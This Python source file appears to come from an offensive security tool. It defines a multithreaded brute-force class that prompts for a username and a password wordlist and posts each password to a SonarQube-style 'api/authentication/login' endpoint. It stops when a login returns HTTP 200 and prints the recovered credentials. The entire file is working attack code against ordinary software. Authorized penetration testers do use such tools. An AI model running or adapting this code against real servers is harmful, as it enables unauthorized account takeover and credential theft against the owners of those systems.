from concurrent.futures import ThreadPoolExecutor, as_completed
from utils.Utils import Utils as pg
from views.SonarViews import SonarViews as sViews
import requests
import os

class BruteForce():

    def __init__(self, url, request):
        self.url = url
        self.request = request
        self.flag = False
        self.pwd = None
        self.user = ""
        self.pathDict = ""
        self.threads = 5
        self._inputDataBF()
    
    def _inputDataBF(self):
        print(sViews.BRUTEFORCE_START)
        print(sViews.QUANTITY_BEGIN, end="")
        self.user = input("  [|] Enter Username: ")
        self.pathDict = input("  [|] Enter the Passwords Path File: ")
        print(sViews.QUANTITY_END, end="")
        self.threads = int(input("  [|] Enter Threads (5): "))

        isExist = os.path.exists(self.pathDict)
        if(not isExist):
            print(sViews.BRUTEFORCE_DICT_ERROR)
            exit(0)
        
    def _authReq(self, user, pwd, progress, fileSize):
        if(not self.flag):
            try:
                pg().printProgressBar(progress, fileSize)
                endpoint = self.url + "api/authentication/login"
                dload = {"login": user, 
                        "password": pwd.replace("\n","").replace("\r","")}
                req = self.request.post(endpoint, data=dload)

                if(req.status_code == 200):
                    self.flag = True
                    self.pwd = pwd
                    return True
            except requests.exceptions.RequestException as e:
                return e

    # https://creativedata.stream/multi-threading-api-requests-in-python/#comments
    # multithreads
    # reference: https://stackoverflow.com/questions/24890368/iterate-over-large-file-with-progress-indicator-in-python
    def bruteForce(self):
        threads= []
        fileSize = os.path.getsize(self.pathDict)
        progress = 0

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            with open(self.pathDict, 'r', encoding="utf-8") as inputFile:
                for pwd in inputFile:
                    progress = progress + len(pwd)
                    threads.append(executor.submit(self._authReq, self.user, pwd, progress, fileSize))

                for task in as_completed(threads):
                    task.result()
        print("")
        if(self.pwd != None):
            print(f"{sViews.BRUTEFORCE_OK} {self.user} : {self.pwd}")
        else:
            print(sViews.BRUTEFORCE_ERROR)
        print(sViews.BRUTEFORCE_END)
    